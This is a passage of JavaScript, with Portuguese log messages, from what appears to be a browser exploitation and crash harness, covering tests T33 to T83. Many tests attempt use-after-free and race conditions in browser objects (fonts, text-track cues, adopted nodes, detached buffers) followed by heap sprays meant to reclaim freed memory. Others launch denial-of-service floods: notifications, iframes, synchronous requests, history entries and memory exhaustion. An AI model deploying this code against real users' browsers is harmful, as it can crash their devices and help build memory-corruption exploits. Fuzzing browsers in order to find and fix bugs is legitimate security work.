    }, 2000);
}

function runTest33() {
    log("Iniciando T33: Cross-Doc Node Adoption...");
    var doc1 = document.implementation.createHTMLDocument("doc1");
    var doc2 = document.implementation.createHTMLDocument("doc2");
    var nodePool = [];
    
    try {
        for(var i=0; i<500; i++) {
            var n = doc1.createElement('div');
            n.id = "node_" + i;
            doc1.body.appendChild(n);
            nodePool.push(n);
        }
        
        var iter = 0;
        var i = setInterval(function() {
            for(var j=0; j<50; j++) {
                if(nodePool.length > 0) {
                    var n = nodePool.shift();
                    doc2.adoptNode(n); 
                    doc2.body.appendChild(n);
                    
                    n.setAttribute("adopted", "true");
                    doc1.adoptNode(n); 
                }
            }
            iter++;
            if(iter > 20) {
                clearInterval(i);
                log(">> T33: Node adoption cycle finished.");
            }
        }, 50);
    } catch(e) { log(">> T33 Erro: " + e); }
}

function runTest34() {
    log("Iniciando T34: CSS Calc Deep Nesting...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    var depth = 200;
    var style = "10px";
    
    for(var i=0; i<depth; i++) {
        style = "calc(1px + " + style + ")";
    }
    
    try {
        el.style.width = style;
        var computed = window.getComputedStyle(el).width;
        
        var styles = [];
        for(var k=0; k<1000; k++) {
            var d = document.createElement('div');
            d.style.width = style; 
            styles.push(d);
        }
        log(">> T34: CSS Calc Parse OK. Depth: " + depth);
    } catch(e) {
        log(">> T34 Parser Crash: " + e.message);
    }
    document.body.removeChild(el);
}

function runTest35() {
    log("Iniciando T35: RegExp Cache Poisoning...");
    var cache = [];
    try {
        for(var i=0; i<5000; i++) {
            var p = "(a|b|c)" + i + ".*[x-z]"; 
            var r = new RegExp(p);
            r.test("testing string for cache entry " + i);
            
            if(i % 100 === 0) {
                cache.push(r); 
            }
        }
        
        var stress = new RegExp("((a+)+)+");
        stress.exec("aaaaaaaaaaaaaaaaaaaaa"); 
        
        log(">> T35: RegExp Cache filled with " + i + " entries.");
    } catch(e) { log(">> T35 Erro: " + e); }
}

function runTest36() {
    log("Iniciando T36: Prototype Chain Bomb...");
    var root = {};
    var curr = root;
    var depth = 0;
    
    try {
        while(depth < 8000) {
            var next = {};
            Object.setPrototypeOf(curr, next);
            curr = next;
            depth++;
            if(depth % 1000 === 0) {
                curr.someProp = new Uint8Array(100).fill(1);
            }
        }
        var search = root.someProp; 
        log(">> T36: Proto Chain Depth: " + depth);
    } catch(e) {
        log(">> T36 Engine Limit: " + e.message);
    }
}

function runTest37() {
    log("Iniciando T37: Huge String Join (OOM)...");
    var parts = 200000;
    var filler = "A".repeat(1024); 
    
    try {
        var arr = new Array(parts);
        log(".. Allocating array elements...");
        for(var i=0; i<100; i++) arr[i] = filler; 
        
        log(".. Attempting Join...");
        var massive = arr.join("B"); 
        
        log(">> T37: Join Success (Len: " + massive.length + ")");
    } catch(e) {
        log(">> T37 Allocation Failed: " + e.message);
        var cleanup = new ArrayBuffer(1024*1024); 
    }
}

function runTest38() {
    log("Iniciando T38: Unaligned DataView Stress...");
    var buffer = new ArrayBuffer(0x10000); 
    var view = new DataView(buffer);
    var count = 0;
    
    try {
        for(var i=0; i<buffer.byteLength - 8; i+=1) { 
            view.setFloat64(i, 1.23456789, true);
            var v = view.getFloat64(i, true);
            
            if(i % 4096 === 4095) { 
                var pageCross = view.getInt32(i, true); 
                count++;
            }
        }
        var sprays = [];
        for(var k=0; k<1000; k++) sprays.push(new DataView(new ArrayBuffer(128)));
        
        log(">> T38: Unaligned ops: " + count + " pages crossed.");
    } catch(e) { log(">> T38 Erro: " + e); }
}

function runTest39() {
    log("Iniciando T39: Event Listener Exhaustion...");
    var el = document.createElement('button');
    var count = 0;
    var functions = [];
    
    try {
        for(var i=0; i<20000; i++) {
            var fn = function() { return i; };
            el.addEventListener('click', fn);
            functions.push(fn); 
            count++;
        }
        
        el.click(); 
        
        for(var j=0; j<functions.length; j++) {
            el.removeEventListener('click', functions[j]);
        }
        log(">> T39: Listeners added/removed: " + count);
    } catch(e) {
        log(">> T39 Resource Limit: " + e.message);
    }
}

function runTest40() {
    log("Iniciando T40: Null Object Property Spray...");
    var container = [];
    var spraySize = 50000;
    
    try {
        log(".. Creating null-proto objects...");
        for(var i=0; i<spraySize; i++) {
            var obj = Object.create(null);
            obj["p" + i] = i;
            obj["buffer"] = new ArrayBuffer(16);
            if(i % 2 === 0) obj["padding"] = "P".repeat(32);
            container.push(obj);
        }
        
        var finder = container[spraySize-1]["p" + (spraySize-1)];
        
        container = null; 
        var reclaim = new Uint32Array(1024*1024).fill(0xCC);
        
        log(">> T40: Objects sprayed: " + spraySize);
    } catch(e) { log(">> T40 Erro: " + e); }
}
function runTest41() {
    log("Iniciando T41: FontFaceSet UAF...");
    var f = new FontFace('t', 'url(data:font/woff;base64,d09GRgABAAAA...)');
    document.fonts.add(f);
    var arr = [];
    var spray = [];
    
    try {
        f.load().then(function() {
            document.fonts.delete(f);
            var b = new Uint8Array(200).fill(0x41);
        }, function(){});
        
        for(var i=0; i<1000; i++) {
            var face = new FontFace('f'+i, 'url(#)');
            document.fonts.add(face);
            arr.push(face);
            if(i % 50 === 0) {
                document.fonts.clear();
                spray.push(new ArrayBuffer(0x100)); 
            }
        }
        var it = document.fonts.keys();
        var next = it.next(); 
        log(">> T41: Font iterators stressed.");
    } catch(e) { log(">> T41 Erro: " + e.message); }
}

function runTest42() {
    log("Iniciando T42: Worker Transferable Race...");
    var workers = [];
    var buffers = [];
    
    for(var i=0; i<8; i++) { 
        var b = new Blob(["onmessage=function(e){postMessage(e.data, [e.data]);}"], {type:'application/javascript'});
        var w = new Worker(URL.createObjectURL(b));
        workers.push(w);
    }
    
    var interval = setInterval(function() {
        for(var j=0; j<workers.length; j++) {
            try {
                var buf = new ArrayBuffer(1024 * 1024);
                workers[j].postMessage(buf, [buf]);
                
                if(Math.random() > 0.8) {
                    workers[j].terminate();
                    workers[j] = new Worker(URL.createObjectURL(new Blob([""], {type:'js'})));
                }
            } catch(e) {}
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(interval);
        log(">> T42: Worker race finished.");
    }, 4000);
}

function runTest43() {
    log("Iniciando T43: NodeIterator Detach...");
    var root = document.createElement('div');
    root.innerHTML = "<span><a><b>text</b></a></span>".repeat(100);
    document.body.appendChild(root);
    
    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, null, false);
    var node;
    var count = 0;
    
    try {
        while((node = ni.nextNode())) {
            count++;
            if(count % 20 === 0) {
                var r = document.createRange();
                r.selectNode(node);
                r.deleteContents(); 
                
                var junk = document.createElement('div');
                junk.setAttribute('a', 'x'.repeat(1000));
                
                node.textContent = "A"; 
            }
        }
    } catch(e) { log(">> T43 Logic: " + e.message); }
    
    document.body.removeChild(root);
    log(">> T43: NodeIterator traversal attempted.");
}

function runTest44() {
    log("Iniciando T44: Array Splice Proxy Trap...");
    var a = [1, 2, 3, 4];
    var p = new Proxy(a, {
        get: function(target, prop) {
            if (prop === 'length') {
                target[1000] = 100; 
                var spray = [];
                for(var i=0; i<5000; i++) spray.push({a: 1, b: new Uint8Array(64)});
                return target.length;
            }
            return target[prop];
        }
    });
    
    try {
        Array.prototype.splice.call(p, 0, 1);
        log(">> T44: Splice executed on Proxy.");
    } catch(e) {
        log(">> T44 Crash Vector: " + e.message);
    }
}

function runTest45() {
    log("Iniciando T45: TextTrack Cue Invalidation...");
    var v = document.createElement('video');
    var t = v.addTextTrack("subtitles", "Test", "en");
    t.mode = "showing";
    var cues = [];
    
    try {
        for(var i=0; i<500; i++) {
            var c = new VTTCue(i, i+1, "Text " + i);
            t.addCue(c);
            cues.push(c);
        }
        
        for(var j=0; j<cues.length; j++) {
            t.removeCue(cues[j]);
            cues[j].text = "MODIFIED AFTER REMOVAL"; 
            cues[j].line = 5;
            
            if(j % 50 === 0) {
                var heavy = new Uint32Array(1024).fill(0xDEADBEEF);
            }
        }
        log(">> T45: Cues manipulated post-removal.");
    } catch(e) { log(">> T45 Erro: " + e.message); }
}

function runTest46() {
    log("Iniciando T46: Sync XHR Thread Lock...");
    var count = 0;
    var max = 50; 
    
    var t = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", window.location.href + "?nocache=" + Math.random(), false); 
            xhr.send(null);
            count++;
            
            if(count > max) {
                clearInterval(t);
                log(">> T46: Sync Requests sent: " + count);
            }
        } catch(e) {
            log(">> T46 Net Error: " + e.message);
        }
    }, 10); 
}

function runTest47() {
    log("Iniciando T47: History State Flood...");
    var junk = "A".repeat(1024 * 512); 
    var i = 0;
    
    try {
        while(i < 5000) {
            history.pushState({data: junk}, "S" + i, "/?s=" + i);
            i++;
            if(i % 100 === 0) {
                var f = document.createElement('div'); 
                f = null;
            }
        }
    } catch(e) {
        log(">> T47 Memory Limit/Crash: " + e.message);
    }
}

function runTest48() {
    log("Iniciando T48: Storage I/O Thrashing...");
    localStorage.clear();
    var val = "X".repeat(1024 * 50); 
    var running = true;
    
    setTimeout(function(){ running = false; log(">> T48: I/O Stop."); }, 4000);
    
    var loop = function() {
        if(!running) return;
        try {
            for(var i=0; i<50; i++) {
                localStorage.setItem("key"+i, val);
            }
            for(var i=0; i<50; i++) {
                localStorage.removeItem("key"+i);
            }
            setTimeout(loop, 0); 
        } catch(e) { log(">> T48 Erro: " + e.message); }
    };
    loop();
}

function runTest49() {
    log("Iniciando T49: Recursive Iframe Stack...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var depth = 0;
    
    function dive(parent) {
        depth++;
        if(depth > 500) return; 
        
        var ifr = document.createElement('iframe');
        parent.appendChild(ifr);
        
        try {
            var d = ifr.contentDocument;
            d.open();
            d.write("<div>Depth " + depth + "</div>");
            d.close();
            
            setTimeout(function() { dive(d.body); }, 0);
        } catch(e) {}
    }
    
    dive(container);
    log(">> T49: Recursion initiated.");
}

function runTest50() {
    log("Iniciando T50: URL Object Handle Leak...");
    var blobs = [];
    var urls = [];
    var data = new Uint8Array(1024).fill(1);
    
    var t = setInterval(function() {
        for(var i=0; i<500; i++) {
            var b = new Blob([data]);
            var u = URL.createObjectURL(b);
            urls.push(u); 
            
            if(urls.length % 10000 === 0) {
                log(".. Handles open: " + urls.length);
            }
        }
        
        if(urls.length > 100000) {
            clearInterval(t);
            log(">> T50: Handle exhaustion limit.");
        }
    }, 50);
}
function runTest51() {
    log("Iniciando T51: Document.write Re-entrancy...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var d = f.contentDocument;
    
    try {
        d.open();
        d.write('<script>parent.log(".. Frame Script Executing"); window.location.reload();<\/script>');
        
        var s = document.createElement('script');
        s.textContent = "document.write('<h1>OVERWRITTEN</h1>');";
        d.body.appendChild(s); 
        
        for(var i=0; i<100; i++) {
            d.write("<div>" + "A".repeat(1000) + "</div>");
            if(i === 50) {
                f.src = "about:blank"; 
                var junk = new Uint32Array(0x4000).fill(0x1337);
            }
        }
        d.close();
    } catch(e) { log(">> T51 Logic: " + e.message); }
    
    setTimeout(function() { 
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T51: Write operations finished.");
    }, 2000);
}

function runTest52() {
    log("Iniciando T52: AdoptNode Getter Poison...");
    var docA = document.implementation.createHTMLDocument("A");
    var docB = document.implementation.createHTMLDocument("B");
    var div = docA.createElement("div");
    docA.body.appendChild(div);
    
    var poison = {
        get id() {
            if(div.parentNode) div.parentNode.removeChild(div);
            var spray = [];
            for(var k=0; k<1000; k++) spray.push(new Uint8Array(255).fill(0xCC)); 
            return "poison";
        }
    };
    
    try {
        Object.defineProperty(div, "id", poison);
        for(var i=0; i<500; i++) {
            var clone = docA.createElement("div");
            docA.body.appendChild(clone);
            docB.adoptNode(clone); 
        }
        docB.adoptNode(div); 
        log(">> T52: Adoption trap executed.");
    } catch(e) { log(">> T52 Erro: " + e.message); }
}

function runTest53() {
    log("Iniciando T53: RegExp Replace Mutation...");
    var str = "A".repeat(10000);
    var regex = /A/g;
    var count = 0;
    
    var victim = {
        toString: function() {
            count++;
            if(count % 100 === 0) {
                str = null; 
                var heavy = new ArrayBuffer(0x100000); 
                return "B";
            }
            return "A";
        }
    };
    
    try {
        regex.lastIndex = 5000;
        var res = str.replace(regex, victim);
        
        var check = [];
        for(var i=0; i<200; i++) check.push(res.substr(i*10, 10));
        
        log(">> T53: RegExp replace cycle done. Count: " + count);
    } catch(e) {
        log(">> T53 Crash Logic: " + e.message);
    }
}

function runTest54() {
    log("Iniciando T54: Prototype Hijack Spray...");
    var original = Node.prototype.appendChild;
    var count = 0;
    
    Node.prototype.appendChild = function(arg) {
        count++;
        if(count % 50 === 0) {
            var arr = new Array(100);
            for(var i=0; i<100; i++) arr[i] = document.createElement('span');
        }
        return original.apply(this, arguments);
    };
    
    try {
        var root = document.createElement('div');
        for(var j=0; j<2000; j++) {
            var el = document.createElement('div');
            root.appendChild(el); 
        }
        
        Node.prototype.appendChild = original; 
        log(">> T54: Hijack calls processed: " + count);
    } catch(e) {
        Node.prototype.appendChild = original;
        log(">> T54 Erro: " + e.message);
    }
}

function runTest55() {
    log("Iniciando T55: CSS Rule Insert Race...");
    var style = document.createElement('style');
    document.head.appendChild(style);
    var sheet = style.sheet;
    var running = true;
    
    setTimeout(function() { running = false; log(">> T55: Race stop."); }, 3000);
    
    function spam() {
        if(!running) return;
        try {
            for(var i=0; i<100; i++) {
                sheet.insertRule("#id" + i + " { color: red; }", 0);
                var rules = sheet.cssRules; 
                if(rules.length > 50) sheet.deleteRule(rules.length - 1);
            }
            // Força recalculo de estilo
            var x = document.body.offsetHeight;
            setTimeout(spam, 0);
        } catch(e) { log(">> T55 Error: " + e.message); }
    }
    spam();
}

function runTest56() {
    log("Iniciando T56: XHR FD Leak...");
    var reqs = [];
    var t = setInterval(function() {
        try {
            for(var i=0; i<20; i++) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "/", true);
                xhr.send();
                reqs.push(xhr); 
            }
            if(reqs.length > 3500) {
                log(".. Active XHRs: " + reqs.length);
                if(reqs.length > 10000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T56 Kernel Limit: " + e.message);
        }
    }, 50);
}

function runTest57() {
    log("Iniciando T57: Recursive Blob Expansion...");
    var blobs = [new Blob(["start"], {type: "text/plain"})];
    
    try {
        for(var i=0; i<25; i++) { 
            var next = [];
            for(var j=0; j<blobs.length; j++) {
                next.push(new Blob([blobs[j], blobs[j]], {type: "application/octet-stream"}));
            }
            blobs = next;
            log(".. Level " + i + ": " + blobs.length + " blobs");
            
            if(i > 15) { 
               var u = URL.createObjectURL(blobs[0]); 
            }
        }
        log(">> T57: Exponential Blob created.");
    } catch(e) {
        log(">> T57 Memory Fail: " + e.message);
        blobs = null; 
    }
}

function runTest58() {
    log("Iniciando T58: Window Name Huge Alloc...");
    var base = "A".repeat(1024 * 1024); 
    var huge = "";
    
    try {
        log(".. Building string...");
        for(var i=0; i<50; i++) {
            huge += base;
        }
        window.name = huge; 
        
        var check = window.name.length;
        log(">> T58: Window.name set to " + check + " bytes.");
        
        history.pushState(null, huge.substring(0, 100), "#" + huge.substring(0, 1000));
        
    } catch(e) {
        log(">> T58 Alloc Fail: " + e.message);
    }
    window.name = ""; 
}

function runTest59() {
    log("Iniciando T59: Heap Priming Fragmentation...");
    var buffer = [];
    var primes = [4093, 8191, 16381, 32749, 65521]; 
    
    try {
        for(var i=0; i<5000; i++) {
            var size = primes[i % primes.length];
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = i & 0xFF;
            view[size-1] = 0xAA;
            
            buffer.push(ab);
            
            // Cria buracos na memória para dificultar alocação contígua do kernel
            if(i % 3 === 0) {
                buffer[i] = null;
            }
        }
        
        var tryHuge = new ArrayBuffer(1024 * 1024 * 64); 
        log(">> T59: Heap fragmented & huge alloc attempted.");
    } catch(e) {
        log(">> T59 OOM Triggered: " + e.message);
    }
}

function runTest60() {
    log("Iniciando T60: Iframe Srcdoc Thread Bomb...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var count = 0;
    
    var html = "<html><body><script>for(var i=0;i<10000;i++)Math.random();<\/script></body></html>";
    
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var ifr = document.createElement('iframe');
            ifr.srcdoc = html;
            container.appendChild(ifr);
            count++;
            
            if(count % 500 === 0) {
                container.innerHTML = ""; 
                log(".. Frames cycled: " + count);
            }
        }
        if(count > 5000) {
            clearInterval(i);
            log(">> T60: Thread bomb finished.");
        }
    }, 20);
}
function runTest61() {
    log("Iniciando T61: DataView Detach Race...");
    var ab = new ArrayBuffer(1024);
    var dv = new DataView(ab);
    var workerBlob = new Blob(['onmessage = function(e) { postMessage("pong"); }'], {type: 'application/javascript'});
    var w = new Worker(URL.createObjectURL(workerBlob));
    
    try {
        var race = setInterval(function() {
            w.postMessage(ab, [ab]); 
            try {
                dv.setInt32(0, 0x41414141); 
            } catch(e) {}
            
            if(ab.byteLength === 0) {
                ab = new ArrayBuffer(1024);
                dv = new DataView(ab);
                // Heap Spray para preencher o local liberado
                var spray = new Array(100).fill(new Uint8Array(1024));
            }
        }, 0);
        
        setTimeout(function() {
            clearInterval(race);
            w.terminate();
            log(">> T61: Race finished.");
        }, 3000);
    } catch(e) { log(">> T61 Error: " + e.message); }
}

function runTest62() {
    log("Iniciando T62: Promise Rejection Flood...");
    var count = 0;
    
    function rejector() {
        return new Promise(function(resolve, reject) {
            reject("Force Fail");
        });
    }
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            rejector().catch(function(e) {
                count++;
                if(count % 1000 === 0) {
                   // Cria pressão no Microtask Queue
                   var junk = [];
                   for(var k=0; k<500; k++) junk.push({a:1}); 
                }
            });
        }
        if(count > 20000) {
            clearInterval(t);
            log(">> T62: Microtask queue stressed.");
        }
    }, 10);
}

function runTest63() {
    log("Iniciando T63: Object.defineProperty Loop...");
    var target = {};
    var i = 0;
    
    try {
        while(i < 5000) {
            var prop = "p" + i;
            Object.defineProperty(target, prop, {
                get: function() { 
                    var heavy = new Uint32Array(100).fill(0x12345678);
                    return i; 
                },
                configurable: true,
                enumerable: true
            });
            i++;
        }
        
        // Força enumeração massiva chamando todos os getters
        var keys = Object.keys(target);
        var sum = 0;
        for(var k in target) { sum += target[k]; }
        
        log(">> T63: Properties defined and accessed: " + i);
    } catch(e) {
        log(">> T63 Engine Limit: " + e.message);
    }
}

function runTest64() {
    log("Iniciando T64: Canvas Pattern Recursion...");
    var c = document.createElement('canvas');
    c.width = 100; c.height = 100;
    var ctx = c.getContext('2d');
    
    try {
        var pattern = ctx.createPattern(c, 'repeat');
        var arrays = [];
        
        for(var i=0; i<500; i++) {
            var c2 = document.createElement('canvas');
            c2.width = 100 + i; c2.height = 100;
            var ctx2 = c2.getContext('2d');
            ctx2.fillStyle = pattern;
            ctx2.fillRect(0,0,100,100);
            
            pattern = ctx.createPattern(c2, 'repeat'); 
            
            if(i % 50 === 0) {
                var imgData = ctx2.getImageData(0,0,10,10);
                arrays.push(imgData);
            }
        }
        log(">> T64: Pattern recursion depth reached.");
    } catch(e) {
        log(">> T64 Graphics Fail: " + e.message);
    }
}

function runTest65() {
    log("Iniciando T65: Filter Function Context Swap...");
    var arr = new Array(10000).fill(1);
    var count = 0;
    
    var proxy = new Proxy({}, {
        get: function(t, k) { return 1; },
        has: function(t, k) {
            arr.length = 0; 
            var spray = new Array(5000).fill(1.1);
            return true;
        }
    });
    
    try {
        arr.filter(function(element, index, array) {
            count++;
            if(index === 500) {
                // Troca o contexto 'this' no meio da execução
                arguments[2] = proxy; 
                var x = array[index+1]; 
            }
            return true;
        }, proxy);
        log(">> T65: Filter survived. Count: " + count);
    } catch(e) { log(">> T65 Error: " + e.message); }
}

function runTest66() {
    log("Iniciando T66: Huge ArrayBuffer Map Fail...");
    var buffers = [];
    var totalAlloc = 0;
    
    try {
        var loop = setInterval(function() {
            // Tenta alocar blocos de 128MB (pode falhar no kernel mapping)
            var size = 1024 * 1024 * 128; 
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = 1; 
            view[size-1] = 1;
            
            buffers.push(ab);
            totalAlloc += 128;
            log(".. Alloc: " + totalAlloc + " MB");
            
            if(totalAlloc > 3000) { // Tenta passar de 3GB (limite usual de userland)
                clearInterval(loop);
                log(">> T66: Userland memory limit hit.");
            }
        }, 500);
    } catch(e) {
        log(">> T66 OOM Panic: " + e.message);
    }
}

function runTest67() {
    log("Iniciando T67: Iframe Reload Storm...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    var t = setInterval(function() {
        f.src = window.location.href + "?storm=" + Math.random();
        count++;
        
        if(count % 20 === 0) {
            // Cria garbage no history stack
            history.replaceState(null, null, "/?r=" + count);
        }
        
        if(count > 200) {
            clearInterval(t);
            document.body.removeChild(f);
            log(">> T67: Reload storm stop.");
        }
    }, 15); // Reload muito rápido
}

function runTest68() {
    log("Iniciando T68: Notification API DoS...");
    var notes = [];
    
    if(!("Notification" in window)) {
        log(">> T68: API não suportada.");
        return;
    }
    
    try {
        var spam = setInterval(function() {
            var n = new Notification("CRASH TEST " + Math.random(), {
                body: "A".repeat(1000),
                icon: "http://localhost/junk.png"
            });
            notes.push(n);
            
            // Tenta fechar e reabrir rapidamente para estressar o daemon de UI
            if(notes.length > 50) {
                var old = notes.shift();
                old.close();
            }
            
            if(notes.length > 500) clearInterval(spam);
        }, 10);
    } catch(e) {
        log(">> T68 Error: " + e.message);
    }
}

function runTest69() {
    log("Iniciando T69: GPU Shader Compiler Hang...");
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    
    if(!gl) {
        log(">> T69: WebGL desabilitado (Esperado). Tentando Canvas 2D Path complexo.");
        // Fallback para Canvas 2D Path Storm
        var ctx = c.getContext('2d');
        ctx.beginPath();
        for(var i=0; i<100000; i++) {
            ctx.rect(i%100, i%100, 1, 1);
        }
        ctx.clip(); // Clip complexo é pesado
        ctx.fill();
        log(">> T69: 2D Path Clip enviado.");
        return;
    }
    // Caso WebGL esteja ativo por algum motivo (exploit vector raro)
    log(">> T69: WebGL active?!?");
}

function runTest70() {
    log("Iniciando T70: WebSQL Transaction Lock...");
    if(!window.openDatabase) {
        log(">> T70: WebSQL não suportado.");
        return;
    }
    
    var db = openDatabase('crashDB', '1.0', 'Crash Test', 2 * 1024 * 1024);
    var tables = 0;
    
    function flood() {
        db.transaction(function(tx) {
            for(var i=0; i<500; i++) {
                tx.executeSql('CREATE TABLE IF NOT EXISTS t'+tables+' (id unique, log)');
                tx.executeSql('INSERT INTO t'+tables+' (id, log) VALUES (1, "'+ "x".repeat(1000) +'")');
                tables++;
            }
            // Recursão dentro da transação para travar o thread SQL
            if(tables < 5000) setTimeout(flood, 0);
            else log(">> T70: SQL Flood sent.");
        });
    }
    flood();
}
function runTest71() {
    log("Iniciando T71: Array Constructor Poison...");
    var original = Array.prototype.constructor;
    var count = 0;
    
    var p = new Proxy(Array, {
        construct: function(target, args) {
            count++;
            if(count % 50 === 0) {
                var junk = new Uint32Array(1024).fill(0x1337);
                return { length: 0xFFFFFFFF }; 
            }
            return new target(...args);
        }
    });
    
    try {
        var a = new p(10);
        var b = Array.from({length: 1000}, (v, k) => k); 
        
        b.constructor = p;
        var c = b.slice(0, 500);
        
        log(">> T71: Poisoned slice executed.");
    } catch(e) {
        log(">> T71 Logic Error: " + e.message);
    }
}

function runTest72() {
    log("Iniciando T72: Function Bind Recursion...");
    var fn = function() { return 1; };
    var bound = fn;
    
    try {
        for(var i=0; i<50000; i++) {
            bound = bound.bind(null, i);
        }
        log(".. Binding depth: 50000");
        
        var res = bound();
        log(">> T72: Execution survived depth.");
    } catch(e) {
        log(">> T72 Stack Limit: " + e.message);
    }
}

function runTest73() {
    log("Iniciando T73: JSON Cyclic Stringify...");
    var a = {};
    var b = {parent: a};
    a.child = b;
    
    var replacer = function(key, value) {
        if(key === 'parent') {
            var leak = new Array(1000).fill(1.1);
            return value; 
        }
        return value;
    };
    
    try {
        // Tenta enganar a detecção de ciclo manipulando o objeto durante o stringify
        var s = JSON.stringify(a, replacer);
        log(">> T73: Stringify completed (Unexpected).");
    } catch(e) {
        log(">> T73 Cycle Detected/Crash: " + e.message);
        var cleanup = new ArrayBuffer(0x10000);
    }
}

function runTest74() {
    log("Iniciando T74: Accessor Property Stack...");
    var obj = {};
    var depth = 0;
    
    function makeGetter(prev) {
        return function() {
            depth++;
            var x = new Uint8Array(16); 
            return prev.val + 1;
        };
    }
    
    var curr = {val: 1};
    for(var i=0; i<3000; i++) {
        var next = {};
        Object.defineProperty(next, 'val', {
            get: makeGetter(curr),
            configurable: true
        });
        curr = next;
    }
    
    try {
        var res = curr.val;
        log(">> T74: Accessor chain depth: " + depth);
    } catch(e) { log(">> T74 Limit: " + e.message); }
}

function runTest75() {
    log("Iniciando T75: WebKit URL Parser Overflow...");
    var base = "http://a.com/";
    var huge = "x".repeat(0x10000); 
    var urls = [];
    
    try {
        for(var i=0; i<50; i++) {
            var u = new URL(huge, base);
            u.username = "user" + "A".repeat(5000);
            u.password = "pass" + "B".repeat(5000);
            u.search = "?q=" + "C".repeat(5000);
            u.hash = "#" + "D".repeat(5000);
            urls.push(u.href);
            
            if(i % 10 === 0) {
                var check = u.toString();
                if(check.length < 100) throw "Truncated";
            }
        }
        log(">> T75: URL parsing stress done.");
    } catch(e) { log(">> T75 Erro: " + e.message); }
}

function runTest76() {
    log("Iniciando T76: Canvas Pixel Manipulation...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096; 
    var ctx = c.getContext('2d');
    
    if(!ctx) { log(">> T76: Context failed."); return; }
    
    try {
        // Aloca buffer massivo para putImageData (4096*4096*4 bytes = ~64MB)
        var arr = new Uint8ClampedArray(4096 * 4096 * 4);
        arr.fill(255);
        var imgData = new ImageData(arr, 4096, 4096);
        
        for(var i=0; i<10; i++) {
            ctx.putImageData(imgData, 0, 0); 
            var sub = ctx.getImageData(100, 100, 2000, 2000); 
            log(".. Cycle " + i + " GPU memory hit");
        }
        log(">> T76: Large Pixel Buffer operations done.");
    } catch(e) {
        log(">> T76 OOM: " + e.message);
    }
}

function runTest77() {
    log("Iniciando T77: TextEncoder Memory Spike...");
    var enc = new TextEncoder();
    var chunk = "A".repeat(1024 * 1024); 
    var arr = [];
    
    try {
        for(var i=0; i<200; i++) {
            // Encode cria Uint8Array nativo. Fazer isso rápido fragmenta o heap.
            var u8 = enc.encode(chunk + i);
            arr.push(u8);
            
            // Força liberar a cada 50MB para causar "churn"
            if(arr.length > 50) {
                arr = [];
                var hole = new ArrayBuffer(1024 * 512); 
            }
        }
        log(">> T77: Encoding churn finished.");
    } catch(e) { log(">> T77 Crash: " + e.message); }
}

function runTest78() {
    log("Iniciando T78: DOM Deep Clone...");
    var root = document.createElement('div');
    var curr = root;
    for(var i=0; i<2000; i++) {
        var el = document.createElement('div');
        el.setAttribute('data-id', i);
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var clones = [];
        for(var k=0; k<50; k++) {
            var c = root.cloneNode(true); 
            clones.push(c);
            if(k % 10 === 0) log(".. Clone " + k);
        }
        clones = null; 
        log(">> T78: Deep cloning stress passed.");
    } catch(e) {
        log(">> T78 Stack/Mem Error: " + e.message);
    }
}

function runTest79() {
    log("Iniciando T79: Huge Scroll Event Flood...");
    var d = document.createElement('div');
    d.style.height = "50000px";
    d.style.overflow = "scroll";
    document.body.appendChild(d);
    
    var count = 0;
    d.addEventListener('scroll', function() {
        count++;
        // Heavy logic inside high-frequency event
        var m = new Float32Array(1000);
        for(var j=0; j<1000; j++) m[j] = Math.random();
    });
    
    var t = setInterval(function() {
        d.scrollTop = Math.random() * 50000;
        if(count > 2000) {
            clearInterval(t);
            document.body.removeChild(d);
            log(">> T79: Scroll flood finish. Events: " + count);
        }
    }, 1); 
}

function runTest80() {
    log("Iniciando T80: Iframe Sandbox Violation...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var i = setInterval(function() {
        var f = document.createElement('iframe');
        // Sandbox restrito tentando executar script via srcdoc (Kernel check violation)
        f.setAttribute("sandbox", "allow-same-origin"); 
        f.srcdoc = "<script>while(1);<\/script>";
        container.appendChild(f);
        
        var f2 = document.createElement('iframe');
        f2.setAttribute("sandbox", "allow-scripts");
        f2.src = "data:text/html,<script>parent.log('try');<\/script>";
        container.appendChild(f2);
        
        if(container.childNodes.length > 50) {
            container.innerHTML = "";
            log(".. Sandbox cycle");
        }
    }, 100);
    
    setTimeout(function() {
        clearInterval(i);
        log(">> T80: Sandbox stress stopped.");
    }, 3000);
}
function runTest81() {
    log("Iniciando T81: DOM Token List Toggle Race...");
    var el = document.createElement('div');
    var cls = el.classList;
    var count = 0;
    var classes = [];
    for(var i=0; i<1000; i++) classes.push("c" + i);
    
    try {
        var t = setInterval(function() {
            for(var j=0; j<200; j++) {
                var c = classes[Math.floor(Math.random() * classes.length)];
                cls.toggle(c); 
            }
            if(cls.length > 500) {
                el.className = ""; 
                var spray = new Uint32Array(0x100).fill(0x41414141);
            }
            count++;
            if(count > 1000) {
                clearInterval(t);
                log(">> T81: ClassList thrashing done.");
            }
        }, 0);
    } catch(e) { log(">> T81 Erro: " + e.message); }
}

function runTest82() {
    log("Iniciando T82: WeakMap GC Thrashing...");
    var wm = new WeakMap();
    var cycles = 0;
    
    function churn() {
        var root = {};
        for(var i=0; i<5000; i++) {
            var k = {id: i};
            var v = new Uint8Array(1024); 
            wm.set(k, v);
        }
        cycles++;
        if(cycles % 10 === 0) log(".. GC Cycle " + cycles);
        
        if(cycles < 50) setTimeout(churn, 10); 
        else log(">> T82: WeakMap stress complete.");
    }
    churn();
}

function runTest83() {
    log("Iniciando T83: Text Node Split/Normalize...");
    var d = document.createElement('div');
